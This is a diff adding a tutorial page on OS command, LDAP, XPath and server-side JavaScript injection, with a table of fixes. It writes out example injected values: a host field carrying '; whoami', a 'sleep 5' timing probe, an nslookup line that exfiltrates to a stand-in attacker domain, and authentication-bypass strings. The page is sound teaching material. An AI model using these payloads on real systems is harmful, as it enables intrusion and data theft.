@@ -1,0 +1,134 @@
+---
+sidebar_position: 3
+title: "Command & Code Injection"
+description: "OS command injection, LDAP and XPath injection, and server-side JavaScript injection — the same syntax-breaking trick applied to different interpreters."
+---
+
+import Admonition from '@theme/Admonition';
+
+# Command & Code Injection
+
+`Fundamentals` · `Web Application Security` · `Reading time: ~10 min`
+
+If SQL injection is "user input breaks out of a database query," this family of bugs is "user input breaks out of *some other* interpreter" — the shell, an LDAP directory query, an XPath expression, or even the application's own server-side JavaScript engine.
+
+---
+
+## OS Command Injection
+
+Some applications call out to the operating system directly — resizing an image with an external tool, pinging a host the user supplies, converting a file format. If user input is concatenated into that shell command, an attacker can append their own commands.
+
+```text
+Intended command:
+  ping -c 4 8.8.8.8
+
+Attacker-controlled "host" field: 8.8.8.8; whoami
+
+Resulting command:
+  ping -c 4 8.8.8.8; whoami
+```
+
+Shell **metacharacters** are what make this possible:
+
+| Character | Effect |
+|---|---|
+| `;` | Run a second, unrelated command afterward |
+| `&&` | Run the second command only if the first succeeds |
+| &#124;&#124; | Run the second command only if the first fails |
+| &#124; | Pipe the first command's output into the second command |
+| `` ` `` / `$()` | Command substitution — run a command and inline its output |
+
+<Admonition type="tip" title="Freshers' takeaway">
+
+This is exactly the same shell syntax covered in the Linux fundamentals pages. If you understand *why* `cat file.txt | grep password` works, you already understand the mechanism behind command injection — the only new idea is that the "user" typing into that shell is now a remote attacker, one input field away.
+
+</Admonition>
+
+### Blind Command Injection
+
+Just like blind SQL injection, you don't always see command output directly. The same timing trick applies:
+
+```bash
+host=8.8.8.8; sleep 5
+```
+
+If the response takes ~5 seconds longer with no visible change, the command executed — you just can't see its output. From there, attackers commonly exfiltrate data via DNS (`nslookup $(whoami).attacker.com`) or an out-of-band HTTP callback.
+
+---
+
+## LDAP Injection
+
+Applications that check credentials or search a directory (Active Directory, OpenLDAP) often build an LDAP filter string from user input the same unsafe way SQL gets built:
+
+```text
+Intended filter:
+  (&(uid=alice)(password=secret))
+
+Attacker-controlled uid field: alice)(&)
+
+Resulting filter:
+  (&(uid=alice)(&))(password=secret))
+```
+
+Because LDAP filters use `(`, `)`, `&`, `|`, and `!` as structural characters, injecting them can short-circuit the authentication check in a way conceptually identical to `' OR '1'='1` in SQL.
+
+---
+
+## XPath Injection
+
+The same pattern again, this time against XML documents queried with XPath:
+
+```text
+Intended query:
+  //user[username/text()='alice' and password/text()='secret']
+
+Attacker-controlled username: alice' or '1'='1
+```
+
+If the password check gets short-circuited the same way, an attacker authenticates without a valid password — because XPath, like SQL and LDAP, is a query language with its own syntax that trusts whatever string it's handed.
+
+---
+
+## Server-Side JavaScript Injection
+
+Some Node.js applications use functions like `eval()`, `vm.runInNewContext()`, or templating helpers that evaluate strings as code. If user input reaches one of these, the attacker isn't just manipulating a query — **they're executing arbitrary server-side code**, which is usually worse than SQL injection because it can lead directly to full server compromise (reading files, making outbound network requests, spawning shells).
+
+```js
+// A dangerous pattern:
+const result = eval(userSuppliedExpression);
+```
+
+If `userSuppliedExpression` is attacker-controlled, this is equivalent to giving them a server-side JavaScript shell.
+
+---
+
+## How These All Get Fixed
+
+| Vulnerability | Primary Fix |
+|---|---|
+| OS command injection | Avoid shelling out entirely where possible; when unavoidable, use APIs that pass arguments as an array (never a concatenated string) so the shell never re-parses them. |
+| LDAP injection | Use parameterized/escaped LDAP filter APIs rather than string concatenation. |
+| XPath injection | Use parameterized XPath queries or XQuery variable binding. |
+| Server-side JS injection | Never evaluate user-controlled strings as code. If a "safe" sandboxed eval is unavoidable, treat it as a last resort with strict allowlisting. |
+
+<Admonition type="warning" title="The pattern to remember">
+
+Every bug on this page is the same root cause wearing a different syntax: **a string built by concatenating trusted code with untrusted data, then handed to an interpreter that cannot tell the difference between the two.** The fix is always the same shape too — separate code from data at the API level (parameterization, argument arrays, safe builders) instead of trying to "sanitize" strings after the fact.
+
+</Admonition>
+
+---
+
+## Key Takeaways
+
+- Command injection exploits shell metacharacters (`;`, `&&`, `|`, backticks) the same way SQLi exploits SQL syntax.
+- Blind command injection is detected the same way as blind SQLi: timing differences and out-of-band callbacks.
+- LDAP and XPath injection apply the identical "break out of query syntax" idea to directory and XML queries.
+- Server-side JS injection via `eval()`-like functions is effectively remote code execution, not just data manipulation.
+- The universal fix is separating code from data structurally — not string sanitization.
+
+---
+
+## Next
+
+A related but distinct idea: what happens when the *template engine itself* — not a database or shell — is the thing that trusts user input too much: **[Template Injection (SSTI/CSTI)](./03-template-injection)**.
